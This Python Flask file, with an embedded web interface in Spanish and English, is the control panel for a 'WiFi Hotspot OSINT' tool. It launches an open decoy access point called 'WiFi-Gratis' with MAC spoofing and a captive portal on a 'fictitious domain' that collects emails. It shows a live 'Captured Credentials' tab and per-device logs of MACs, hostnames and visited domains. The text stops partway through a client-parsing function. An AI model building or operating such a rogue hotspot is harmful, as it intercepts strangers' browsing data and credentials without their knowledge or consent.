#!/usr/bin/env python3
"""
Panel Web de Control - WiFi Hotspot OSINT
Se ejecuta al inicio del script bash y permite controlarlo desde el navegador
"""

from flask import Flask, render_template_string, jsonify, request
from flask_socketio import SocketIO
import subprocess
import threading
import time
import os
import signal
import sys
import re
from collections import defaultdict

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hotspot-control'
socketio = SocketIO(app, cors_allowed_origins="*")

# Estado del hotspot
state = {
    'running': False,
    'process': None,
    'config': {
        'mode': '1',
        'ssid': 'WiFi-Gratis',
        'password': '',
        'channel': '6',
        'mac_spoofing': '1',
        'custom_mac': '',
        'captive_portal': '0'
    },
    'clients': {},
    'dns_history': defaultdict(list)
}

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, 'logs')
SCRIPT_PATH = os.path.join(SCRIPT_DIR, 'wifi_hotspot_osint.sh')

def check_hotspot_running():
    """Verificar si el hotspot está realmente corriendo detectando procesos"""
    try:
        # Verificar si hostapd está corriendo
        result = subprocess.run(['pgrep', '-x', 'hostapd'], capture_output=True)
        hostapd_running = result.returncode == 0
        
        # Verificar si dnsmasq está corriendo
        result = subprocess.run(['pgrep', '-x', 'dnsmasq'], capture_output=True)
        dnsmasq_running = result.returncode == 0
        
        # El hotspot está activo si al menos hostapd está corriendo
        return hostapd_running
    except Exception as e:
        print(f"Error verificando estado del hotspot: {e}")
        return False

HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Hotspot OSINT - Control Panel</title>
    <!-- VERSION: 2.0-TEMPLATES-ADDED -->
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #000000;
            color: #cccccc;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        
        h1 {
            color: #58a6ff;
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
        }
        
        .status.active {
            background: rgba(63, 185, 80, 0.15);
            color: #3fb950;
            border: 1px solid #3fb950;
        }
        
        .status.inactive {
            background: rgba(248, 81, 73, 0.15);
            color: #f85149;
            border: 1px solid #f85149;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        .status.active .status-dot { background: #3fb950; }
        .status.inactive .status-dot { background: #f85149; }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .grid {
            display: grid;
            grid-template-columns: 400px 1fr;
            gap: 20px;
        }
        
        .panel {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 25px;
        }
        
        .panel-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ffffff;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #cccccc;
        }
        
        .form-input, .form-select {
            width: 100%;
            padding: 12px;
            background: #000000;
            border: 1px solid #1a1a1a;
            border-radius: 6px;
            color: #cccccc;
            font-size: 14px;
        }
        
        .form-input:focus, .form-select:focus {
            outline: none;
            border-color: #333333;
            background: #0a0a0a;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #ffffff;
            color: #000000;
            font-weight: 600;
        }
        
        .btn-primary:hover {
            background: #e0e0e0;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: transparent;
            color: #cccccc;
            border: 1px solid #1a1a1a;
        }
        
        .btn-danger:hover {
            background: #0a0a0a;
            border-color: #333333;
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .logs-container {
            background: #000000;
            border: 1px solid #1a1a1a;
            border-radius: 6px;
            padding: 15px;
            height: calc(100vh - 250px);
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        .log-line {
            margin-bottom: 4px;
            padding: 4px 8px;
            border-radius: 4px;
        }
        
        .log-line.error {
            background: rgba(248, 81, 73, 0.1);
            color: #f85149;
            border-left: 3px solid #f85149;
        }
        
        .log-line.warning {
            background: rgba(210, 153, 34, 0.1);
            color: #d29922;
            border-left: 3px solid #d29922;
        }
        
        .log-line.success {
            background: rgba(63, 185, 80, 0.1);
            color: #3fb950;
            border-left: 3px solid #3fb950;
        }
        
        .log-line.info {
            color: #58a6ff;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            border-bottom: 1px solid #1a1a1a;
        }
        
        .tab {
            padding: 10px 20px;
            background: transparent;
            color: #555555;
            border: none;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            border-bottom: 2px solid transparent;
            margin-bottom: -1px;
            transition: all 0.3s ease;
        }
        
        .tab:hover {
            color: #cccccc;
            background: rgba(255, 255, 255, 0.03);
        }
        
        .tab.active {
            color: #ffffff;
            border-bottom-color: #ffffff;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .mode-description {
            background: #000000;
            border: 1px solid #1a1a1a;
            border-radius: 6px;
            padding: 10px;
            margin-top: 8px;
            font-size: 13px;
            color: #555555;
        }
        
        .alert {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 3px solid;
        }
        
        .alert.info {
            background: rgba(255, 255, 255, 0.02);
            border-color: #1a1a1a;
            color: #888888;
        }
        
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track { background: #000000; }
        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 5px; }
        ::-webkit-scrollbar-thumb:hover { background: #2a2a2a; }
        
        .language-selector {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .language-selector select {
            background: #0a0a0a;
            color: #ffffff;
            border: 1px solid #1a1a1a;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }
        
        .language-selector select:hover {
            border-color: #2a2a2a;
        }
    </style>
</head>
<body>
    <div class="language-selector">
        <span style="color: #888888; font-size: 14px;">🌐</span>
        <select id="language-select" onchange="changeLanguage(this.value)">
            <option value="es">Español</option>
            <option value="en">English</option>
        </select>
    </div>
    
    <div class="container">
        <div class="grid">
            <div class="panel">
                <div class="panel-title">Configuracion del Hotspot</div>
                
                <div class="alert info" id="info-alert">
                    Configura el hotspot y haz clic en "Iniciar"
                </div>
                
                <form id="config-form">
                    <!-- Sección de Modo de Operación eliminada - Siempre en modo OSINT -->
                    <input type="hidden" id="mode" value="1">
                    
                    <div class="form-group">
                        <label class="form-label">Nombre de Red (SSID)</label>
                        <input type="text" class="form-input" id="ssid" value="WiFi-Gratis" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Contraseña (vacío = red abierta)</label>
                        <input type="password" class="form-input" id="password" placeholder="Mínimo 8 caracteres">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Portal Cautivo</label>
                        <select class="form-select" id="captive-portal">
                            <option value="0">Desactivado - Acceso directo a internet</option>
                            <option value="1">Activado - Requiere email para acceso</option>
                        </select>
                        <div class="mode-description" style="margin-top: 8px;">
                            Portal cautivo: Los usuarios deben ingresar su email antes de acceder a internet
                        </div>
                    </div>
                    
                    <div class="form-group" id="captive-domain-group" style="display: none;">
                        <label class="form-label">Dominio Ficticio del Portal</label>
                        <input type="text" class="form-input" id="captive-domain" placeholder="wifi-gratis.com" value="conectate-wifi.com">
                        <div class="mode-description" style="margin-top: 8px;">
                            Dominio que aparecera en el portal cautivo (ej: wifi-gratis.com, internet-libre.net)
                        </div>
                    </div>
                    
                    <div class="form-group" id="captive-redirect-group" style="display: none;">
                        <label class="form-label">URL de Redirección</label>
                        <input type="text" class="form-input" id="captive-redirect" placeholder="https://google.com" value="https://google.com">
                        <div class="mode-description" style="margin-top: 8px;">
                            URL a la que se redirigira al usuario despues de ingresar su email
                        </div>
                    </div>
                    
                    
                    <div class="form-group">
                        <label class="form-label">Canal WiFi</label>
                        <select class="form-select" id="channel">
                            <option value="1">Canal 1</option>
                            <option value="6" selected>Canal 6</option>
                            <option value="11">Canal 11</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">MAC Spoofing</label>
                        <select class="form-select" id="mac-spoofing">
                            <option value="1">No cambiar MAC</option>
                            <option value="2">Generar MAC aleatoria</option>
                            <option value="3">Ingresar MAC personalizada</option>
                        </select>
                    </div>
                    
                    <div class="form-group" id="custom-mac-group" style="display: none;">
                        <label class="form-label">MAC Personalizada</label>
                        <input type="text" class="form-input" id="custom-mac" placeholder="XX:XX:XX:XX:XX:XX">
                    </div>
                    
                    <button type="button" class="btn btn-primary" id="btn-start" onclick="startHotspot()">
                        Iniciar Hotspot
                    </button>
                    
                    <button type="button" class="btn btn-danger" id="btn-stop" onclick="stopHotspot()" style="display: none; margin-top: 10px;">
                        Detener Hotspot
                    </button>
                </form>
                
            </div>
            
            <div class="panel">
                <div class="panel-title">Monitoreo</div>
                
                <div class="tabs">
                    <button class="tab active" onclick="switchTab('events')">Eventos de Clientes</button>
                    <button class="tab" onclick="switchTab('logs')">Logs en Tiempo Real</button>
                    <button class="tab" onclick="switchTab('credentials')">Credenciales Capturadas</button>
                </div>
                
                <div id="tab-events" class="tab-content active">
                    <div class="logs-container" id="client-events" style="height: 400px;"></div>
                </div>
                
                <div id="tab-logs" class="tab-content">
                    <div class="form-group" style="margin-bottom: 15px;">
                        <label class="form-label">Filtrar por Dispositivo</label>
                        <select class="form-select" id="device-filter" onchange="filterDevice()">
                            <option value="all">Todos los dispositivos</option>
                        </select>
                        <div id="device-info" style="margin-top: 10px; padding: 10px; background: #0d1117; border-radius: 6px; font-size: 13px; display: none; line-height: 1.6;">
                        </div>
                    </div>
                    
                    <div class="logs-container" id="logs"></div>
                </div>
                
                <div id="tab-credentials" class="tab-content">
                    <div class="form-group" style="margin-bottom: 15px;">
                        <div class="alert info" style="margin: 0;">
                            🕖 Actualización automática cada segundo
                        </div>
                    </div>
                    <pre class="logs-container" id="credentials-logs" style="height: 400px; font-family: monospace; white-space: pre; overflow: auto; background-color: #0d1117; color: #e6edf3; padding: 10px; border-radius: 5px; font-size: 14px;">Cargando credenciales...</pre>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        const socket = io();
        let currentFilter = 'all';
        let allClients = {};
        
        // Sistema de traducciones
        const translations = {
            es: {
                panelTitle: 'Configuracion del Hotspot',
                infoAlert: 'Configura el hotspot y haz clic en "Iniciar"',
                infoAlertActive: 'Hotspot activo - Logs en tiempo real abajo',
                ssidLabel: 'Nombre de Red (SSID)',
                passwordLabel: 'Contraseña (vacío = red abierta)',
                passwordPlaceholder: 'Mínimo 8 caracteres',
                captivePortalLabel: 'Portal Cautivo',
                captiveDisabled: 'Desactivado - Acceso directo a internet',
                captiveEnabled: 'Activado - Requiere email para acceso',
                captiveDescription: 'Portal cautivo: Los usuarios deben ingresar su email antes de acceder a internet',
                captiveDomainLabel: 'Dominio Ficticio del Portal',
                captiveDomainPlaceholder: 'wifi-gratis.com',
                captiveDomainDescription: 'Dominio que aparecera en el portal cautivo (ej: wifi-gratis.com, internet-libre.net)',
                captiveRedirectLabel: 'URL de Redirección',
                captiveRedirectPlaceholder: 'https://google.com',
                captiveRedirectDescription: 'URL a la que se redirigira al usuario despues de ingresar su email',
                channelLabel: 'Canal WiFi',
                channelOption: 'Canal',
                macSpoofingLabel: 'MAC Spoofing',
                macNoChange: 'No cambiar MAC',
                macRandom: 'Generar MAC aleatoria',
                macCustom: 'Ingresar MAC personalizada',
                macCustomLabel: 'MAC Personalizada',
                btnStart: 'Iniciar Hotspot',
                btnStarting: 'Iniciando...',
                btnStop: 'Detener Hotspot',
                btnStopping: 'Deteniendo...',
                monitoringTitle: 'Monitoreo',
                tabEvents: 'Eventos de Clientes',
                tabLogs: 'Logs en Tiempo Real',
                tabCredentials: 'Credenciales Capturadas',
                filterLabel: 'Filtrar por Dispositivo',
                filterAll: 'Todos los dispositivos',
                autoUpdate: '🕖 Actualización automática cada segundo',
                loadingCredentials: 'Cargando credenciales...',
                errorStart: 'Error: No se pudo iniciar',
                errorStop: 'Error: No se pudo detener'
            },
            en: {
                panelTitle: 'Hotspot Configuration',
                infoAlert: 'Configure the hotspot and click "Start"',
                infoAlertActive: 'Hotspot active - Real-time logs below',
                ssidLabel: 'Network Name (SSID)',
                passwordLabel: 'Password (empty = open network)',
                passwordPlaceholder: 'Minimum 8 characters',
                captivePortalLabel: 'Captive Portal',
                captiveDisabled: 'Disabled - Direct internet access',
                captiveEnabled: 'Enabled - Requires email for access',
                captiveDescription: 'Captive portal: Users must enter their email before accessing the internet',
                captiveDomainLabel: 'Portal Fictitious Domain',
                captiveDomainPlaceholder: 'free-wifi.com',
                captiveDomainDescription: 'Domain that will appear in the captive portal (e.g: free-wifi.com, free-internet.net)',
                captiveRedirectLabel: 'Redirect URL',
                captiveRedirectPlaceholder: 'https://google.com',
                captiveRedirectDescription: 'URL to which the user will be redirected after entering their email',
                channelLabel: 'WiFi Channel',
                channelOption: 'Channel',
                macSpoofingLabel: 'MAC Spoofing',
                macNoChange: 'Do not change MAC',
                macRandom: 'Generate random MAC',
                macCustom: 'Enter custom MAC',
                macCustomLabel: 'Custom MAC',
                btnStart: 'Start Hotspot',
                btnStarting: 'Starting...',
                btnStop: 'Stop Hotspot',
                btnStopping: 'Stopping...',
                monitoringTitle: 'Monitoring',
                tabEvents: 'Client Events',
                tabLogs: 'Real-Time Logs',
                tabCredentials: 'Captured Credentials',
                filterLabel: 'Filter by Device',
                filterAll: 'All devices',
                autoUpdate: '🕖 Automatic update every second',
                loadingCredentials: 'Loading credentials...',
                errorStart: 'Error: Could not start',
                errorStop: 'Error: Could not stop'
            }
        };
        
        // Función para cambiar idioma
        function changeLanguage(lang) {
            localStorage.setItem('language', lang);
            const t = translations[lang];
            
            // Actualizar todos los textos de la interfaz
            document.querySelector('.panel-title').textContent = t.panelTitle;
            
            const infoAlert = document.getElementById('info-alert');
            const isActive = infoAlert.innerHTML.includes('activo') || infoAlert.innerHTML.includes('active');
            infoAlert.innerHTML = isActive ? t.infoAlertActive : t.infoAlert;
            
            document.querySelectorAll('.form-label')[0].textContent = t.ssidLabel;
            document.querySelectorAll('.form-label')[1].textContent = t.passwordLabel;
            document.getElementById('password').placeholder = t.passwordPlaceholder;
            
            document.querySelectorAll('.form-label')[2].textContent = t.captivePortalLabel;
            document.querySelector('#captive-portal option[value="0"]').textContent = t.captiveDisabled;
            document.querySelector('#captive-portal option[value="1"]').textContent = t.captiveEnabled;
            document.querySelector('#captive-portal + .mode-description').textContent = t.captiveDescription;
            
            document.querySelectorAll('.form-label')[3].textContent = t.captiveDomainLabel;
            document.getElementById('captive-domain').placeholder = t.captiveDomainPlaceholder;
            document.querySelector('#captive-domain + .mode-description').textContent = t.captiveDomainDescription;
            
            document.querySelectorAll('.form-label')[4].textContent = t.captiveRedirectLabel;
            document.getElementById('captive-redirect').placeholder = t.captiveRedirectPlaceholder;
            document.querySelector('#captive-redirect + .mode-description').textContent = t.captiveRedirectDescription;
            
            document.querySelectorAll('.form-label')[5].textContent = t.channelLabel;
            document.querySelectorAll('#channel option').forEach((opt, i) => {
                opt.textContent = t.channelOption + ' ' + opt.value;
            });
            
            document.querySelectorAll('.form-label')[6].textContent = t.macSpoofingLabel;
            document.querySelector('#mac-spoofing option[value="1"]').textContent = t.macNoChange;
            document.querySelector('#mac-spoofing option[value="2"]').textContent = t.macRandom;
            document.querySelector('#mac-spoofing option[value="3"]').textContent = t.macCustom;
            
            document.querySelectorAll('.form-label')[7].textContent = t.macCustomLabel;
            
            const btnStart = document.getElementById('btn-start');
            if (btnStart.textContent.includes('Iniciando') || btnStart.textContent.includes('Starting')) {
                btnStart.textContent = t.btnStarting;
            } else {
                btnStart.textContent = t.btnStart;
            }
            
            const btnStop = document.getElementById('btn-stop');
            if (btnStop.textContent.includes('Deteniendo') || btnStop.textContent.includes('Stopping')) {
                btnStop.textContent = t.btnStopping;
            } else {
                btnStop.textContent = t.btnStop;
            }
            
            document.querySelectorAll('.panel-title')[1].textContent = t.monitoringTitle;
            document.querySelectorAll('.tab')[0].textContent = t.tabEvents;
            document.querySelectorAll('.tab')[1].textContent = t.tabLogs;
            document.querySelectorAll('.tab')[2].textContent = t.tabCredentials;
            
            document.querySelector('#tab-logs .form-label').textContent = t.filterLabel;
            const filterSelect = document.getElementById('device-filter');
            const currentFilterValue = filterSelect.value;
            if (filterSelect.options[0].value === 'all') {
                filterSelect.options[0].textContent = t.filterAll;
            }
            
            document.querySelector('#tab-credentials .alert').innerHTML = t.autoUpdate;
            
            const credLogs = document.getElementById('credentials-logs');
            if (credLogs.textContent.includes('Cargando') || credLogs.textContent.includes('Loading')) {
                credLogs.textContent = t.loadingCredentials;
            }
        }
        
        // Cargar idioma guardado al iniciar
        document.addEventListener('DOMContentLoaded', function() {
            const savedLang = localStorage.getItem('language') || 'es';
            document.getElementById('language-select').value = savedLang;
            if (savedLang === 'en') {
                changeLanguage('en');
            }
        });
        
        // Función para actualizar visibilidad de campos del portal cautivo
        function updateCaptivePortalFields() {
            const captivePortal = document.getElementById('captive-portal');
            const domainGroup = document.getElementById('captive-domain-group');
            const redirectGroup = document.getElementById('captive-redirect-group');
            
            if (!captivePortal || !domainGroup || !redirectGroup) return;
            
            const shouldShow = captivePortal.value === '1';
            domainGroup.style.display = shouldShow ? 'block' : 'none';
            redirectGroup.style.display = shouldShow ? 'block' : 'none';
            
            console.log('[CAPTIVE] Portal fields visibility updated, showing:', shouldShow);
        }
        
        // Ejecutar al cargar la página
        document.addEventListener('DOMContentLoaded', function() {
            updateCaptivePortalFields();
            
            // Sincronizar estado al cargar
            checkStatus();
        });
        
        socket.on('log', (data) => {
            addLog(data.line);
        });
        
        socket.on('client_event', (data) => {
            addClientEvent(data);
        });
        
        socket.on('status_update', (data) => {
            console.log('Estado actualizado por socket:', data.running);
            updateStatus(data.running);
        });
        
        // Función para verificar estado
        async function checkStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                console.log('Estado verificado:', data);
                updateStatus(data.running);
                if (data.clients) {
                    allClients = data.clients;
                    updateDeviceSelector();
                }
            } catch (error) {
                console.error('Error verificando estado:', error);
            }
        }
        
        // Polling periódico del estado cada 3 segundos
        setInterval(checkStatus, 3000);
        
        socket.on('clients_update', (data) => {
            allClients = data.clients;
            updateDeviceSelector();
        });
        
        function updateDeviceSelector() {
            const selector = document.getElementById('device-filter');
            const currentValue = selector.value;
            
            selector.innerHTML = '<option value="all">Todos los dispositivos</option>';
            
            for (const [ip, info] of Object.entries(allClients)) {
                const option = document.createElement('option');
                option.value = ip;
                
                // Construir texto descriptivo
                let deviceText = ip;
                
                if (info.hostname && info.hostname !== 'Unknown') {
                    deviceText += ` - ${info.hostname}`;
                } else if (info.device_type) {
                    deviceText += ` - ${info.device_type}`;
                } else {
                    deviceText += ' - Unknown';
                }
                
                // Agregar MAC abreviada
                const macShort = info.mac.split(':').slice(0, 3).join(':');
                deviceText += ` (${macShort})`;
                
                option.textContent = deviceText;
                selector.appendChild(option);
            }
            
            if (currentValue && allClients[currentValue]) {
                selector.value = currentValue;
            }
        }
        
        function filterDevice() {
            const selector = document.getElementById('device-filter');
            currentFilter = selector.value;
            
            const deviceInfo = document.getElementById('device-info');
            
            if (currentFilter === 'all') {
                deviceInfo.style.display = 'none';
            } else {
                const client = allClients[currentFilter];
                if (client) {
                    let infoHTML = '<strong>Dispositivo seleccionado:</strong><br>';
                    infoHTML += `<span style="color: #58a6ff;">MAC: ${client.mac}</span><br>`;
                    infoHTML += `<span style="color: #3fb950;">IP: ${currentFilter}</span><br>`;
                    
                    if (client.hostname && client.hostname !== 'Unknown') {
                        infoHTML += `<span style="color: #d29922;">Hostname: ${client.hostname}</span><br>`;
                    }
                    
                    if (client.device_type) {
                        infoHTML += `<span style="color: #f85149;">Tipo: ${client.device_type}</span><br>`;
                    }
                    
                    if (client.vendor) {
                        infoHTML += `<span style="color: #8b949e;">Vendor: ${client.vendor}</span><br>`;
                    }
                    
                    if (client.domains && client.domains.length > 0) {
                        const topDomains = client.domains.slice(0, 3).join(', ');
                        infoHTML += `<span style="color: #58a6ff; font-size: 11px;">Dominios: ${topDomains}...</span>`;
                    }
                    
                    deviceInfo.innerHTML = infoHTML;
                    deviceInfo.style.display = 'block';
                }
            }
            
            // Limpiar y recargar logs filtrados
            document.getElementById('logs').innerHTML = '';
            fetch('/api/filtered_logs?ip=' + currentFilter)
                .then(r => r.json())
                .then(data => {
                    data.logs.forEach(line => addLog(line));
                });
        }
        
        function addClientEvent(event) {
            const container = document.getElementById('client-events');
            const div = document.createElement('div');
            div.className = 'log-line';
            
            const timestamp = new Date().toLocaleTimeString();
            let icon = '';
            
            if (event.type === 'connected') {
                div.classList.add('success');
                icon = '🟢';
            } else if (event.type === 'disconnected') {
                div.classList.add('error');
                icon = '🔴';
            } else if (event.type === 'attempt') {
                div.classList.add('warning');
                icon = '🟡';
            }
            
            let text = `[${timestamp}] ${icon} ${event.message}`;
            if (event.hostname) {
                text += ` - ${event.hostname}`;
            }
            
            div.textContent = text;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
            
            while (container.children.length > 100) {
                container.removeChild(container.firstChild);
            }
        }
        
        function addLog(line) {
            // Filtrar si no es 'all'
            if (currentFilter !== 'all' && !line.includes(currentFilter)) {
                return;
            }
            
            const container = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = 'log-line';
            
            if (line.includes('ERROR') || line.includes('[!]')) {
                div.classList.add('error');
            } else if (line.includes('WARNING') || line.includes('[*]')) {
                div.classList.add('warning');
            } else if (line.includes('[+]') || line.includes('[OK]')) {
                div.classList.add('success');
            } else if (line.includes('[i]')) {
                div.classList.add('info');
            }
            
            div.textContent = line;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
            
            while (container.children.length > 500) {
                container.removeChild(container.firstChild);
            }
        }
        
        function updateStatus(running) {
            const status = document.getElementById('status');
            const statusText = document.getElementById('status-text');
            const btnStart = document.getElementById('btn-start');
            const btnStop = document.getElementById('btn-stop');
            const infoAlert = document.getElementById('info-alert');
            
            if (running) {
                status.className = 'status active';
                statusText.textContent = 'Activo';
                btnStart.style.display = 'none';
                btnStart.disabled = false;
                btnStart.textContent = 'Iniciar Hotspot';
                btnStop.style.display = 'block';
                btnStop.disabled = false;
                infoAlert.innerHTML = 'Hotspot activo - Logs en tiempo real abajo';
            } else {
                status.className = 'status inactive';
                statusText.textContent = 'Detenido';
                btnStart.style.display = 'block';
                btnStart.disabled = false;
                btnStart.textContent = 'Iniciar Hotspot';
                btnStop.style.display = 'none';
                infoAlert.innerHTML = 'Configura el hotspot y haz clic en "Iniciar"';
            }
        }
        
        async function startHotspot() {
            const config = {
                mode: document.getElementById('mode').value,
                ssid: document.getElementById('ssid').value,
                password: document.getElementById('password').value,
                channel: document.getElementById('channel').value,
                mac_spoofing: document.getElementById('mac-spoofing').value,
                custom_mac: document.getElementById('custom-mac').value,
                captive_portal: document.getElementById('captive-portal').value,
                captive_domain: document.getElementById('captive-domain').value,
                captive_redirect: document.getElementById('captive-redirect').value
            };
            
            const btn = document.getElementById('btn-start');
            btn.disabled = true;
            btn.textContent = 'Iniciando...';
            
            try {
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(config)
                });
                
                const data = await response.json();
                
                if (!data.success) {
                    alert('Error: ' + (data.error || 'No se pudo iniciar'));
                    btn.disabled = false;
                    btn.textContent = 'Iniciar Hotspot';
                } else {
                    // Timeout absoluto de 40 segundos que SIEMPRE se ejecuta
                    setTimeout(async () => {
                        console.warn('Timeout de 40 segundos alcanzado');
                        
                        // Verificar estado final
                        const statusResponse = await fetch('/api/status');
                        const statusData = await statusResponse.json();
                        
                        // Actualizar UI basado en el estado real
                        updateStatus(statusData.running);
                        
                        console.log('Estado final después de 40s:', statusData.running ? 'Activo' : 'Inactivo');
                    }, 40000);
                    
                    // Verificar estado cada 3 segundos
                    const checkInterval = setInterval(async () => {
                        try {
                            const statusResponse = await fetch('/api/status');
                            const statusData = await statusResponse.json();
                            
                            if (statusData.running) {
                                clearInterval(checkInterval);
                                updateStatus(true);
                                console.log('Hotspot detectado como activo antes del timeout');
                            }
                        } catch (error) {
                            console.error('Error verificando estado:', error);
                        }
                    }, 3000);
                    
                    // Primera verificación inmediata
                    setTimeout(async () => {
                        const statusResponse = await fetch('/api/status');
                        const statusData = await statusResponse.json();
                        if (statusData.running) {
                            clearInterval(checkInterval);
                            updateStatus(true);
                        }
                    }, 2000);
                }
            } catch (error) {
                alert('Error: ' + error.message);
                btn.disabled = false;
                btn.textContent = 'Iniciar Hotspot';
            }
        }
        
        async function stopHotspot() {
            const btn = document.getElementById('btn-stop');
            btn.disabled = true;
            btn.textContent = 'Deteniendo...';
            
            try {
                const response = await fetch('/api/stop', { method: 'POST' });
                const data = await response.json();
                
                if (!data.success) {
                    alert('Error: ' + (data.error || 'No se pudo detener'));
                } else {
                    // Esperar a que el estado se actualice
                    setTimeout(() => checkStatus(), 1000);
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }
            
            btn.disabled = false;
            btn.textContent = '⏹️ Detener Hotspot';
        }
        
        // Modo de operación eliminado - Ahora siempre es OSINT (1)
        
        // Agregar evento para cambios en el selector del portal cautivo
        document.getElementById('captive-portal').addEventListener('change', () => {
            updateCaptivePortalFields();
        });
        
        function switchTab(tabName) {
            // Remover active de todos los tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Ocultar todo el contenido
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            // Activar el tab seleccionado
            event.target.classList.add('active');
            document.getElementById('tab-' + tabName).classList.add('active');
            
            // Si se selecciona la pestaña de credenciales, activar actualización automática
            if (tabName === 'credentials') {
                setupCredentialsAutoRefresh(true);
            } else {
                setupCredentialsAutoRefresh(false);
            }
        }
        
        let credentialsUpdateInterval = null;
        
        // Función para cargar las credenciales capturadas
        function refreshCredentials() {
            const credentialsElement = document.getElementById('credentials-logs');
            if (!credentialsElement) return; // Si no existe el elemento, no hacer nada
            
            fetch('/api/credentials')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // Mostrar credenciales en formato texto plano
                        if (data.content && data.content.length > 0) {
                            credentialsElement.textContent = data.content.join('');
                        } else {
                            credentialsElement.textContent = 'No hay credenciales capturadas aún.';
                        }
                    } else {
                        credentialsElement.textContent = 'Error: ' + (data.error || 'No se pudieron cargar las credenciales');
                    }
                })
                .catch(error => {
                    console.error('Error obteniendo credenciales:', error);
                    // No mostrar error en la interfaz para evitar parpadeos
                });
        }
        
        // Iniciar o detener la actualización automática según la pestaña activa
        function setupCredentialsAutoRefresh(active) {
            if (active) {
                // Iniciar actualización automática si no está activa
                if (!credentialsUpdateInterval) {
                    refreshCredentials(); // Cargar inmediatamente
                    credentialsUpdateInterval = setInterval(refreshCredentials, 1000); // Actualizar cada segundo
                }
            } else {
                // Detener actualización automática
                if (credentialsUpdateInterval) {
                    clearInterval(credentialsUpdateInterval);
                    credentialsUpdateInterval = null;
                }
            }
        }
        
        // Cargar credenciales al inicio
        document.addEventListener('DOMContentLoaded', function() {
            // Código existente
            updateCaptivePortalFields();
            
            // Sincronizar estado al cargar
            checkStatus();
                
            // Comprobar si la pestaña de credenciales está activa y activar actualización automática
            const credentialsTabContent = document.getElementById('tab-credentials');
            if (credentialsTabContent && credentialsTabContent.classList.contains('active')) {
                setupCredentialsAutoRefresh(true);
            }
        });
    </script>
</body>
</html>
"""

def get_hostname_for_mac(mac_address):
    """Obtener hostname para una MAC desde los clientes actuales"""
    try:
        clients = parse_clients()
        for ip, info in clients.items():
            if info['mac'].lower() == mac_address.lower():
                return info.get('hostname', None)
    except:
        pass
    return None

def infer_device_type(domains):
    """Inferir tipo de dispositivo por dominios visitados"""
    domains_str = ' '.join(domains).lower()
    
    if any(x in domains_str for x in ['android.clients.google', 'play.google', 'gstatic.com', 'android.com']):
        return 'Android'
    elif any(x in domains_str for x in ['apple.com', 'icloud.com', 'apple-dns.net', 'aaplimg.com']):
        return 'iOS/macOS'
    elif any(x in domains_str for x in ['microsoft.com', 'windows.com', 'live.com', 'msn.com']):
        return 'Windows'
    elif any(x in domains_str for x in ['samsung', 'galaxy']):
        return 'Samsung'
    elif any(x in domains_str for x in ['xiaomi', 'mi.com']):
        return 'Xiaomi'
    elif any(x in domains_str for x in ['huawei', 'hicloud']):
        return 'Huawei'
    
    return None

def parse_clients():
    """Parsear archivo de clientes y extraer IPs, MACs y hostnames desde múltiples fuentes"""
    clients = {}
    
    try:
        if not os.path.exists(OUTPUT_DIR):
            return clients
        
        # 1. Parsear archivo clients_*.txt
        client_files = [f for f in os.listdir(OUTPUT_DIR) if f.startswith('clients_') and f.endswith('.txt')]
        if client_files:
            latest_client_file = os.path.join(OUTPUT_DIR, sorted(client_files)[-1])
            
            with open(latest_client_file, 'r', errors='ignore') as f:
                for line in f:
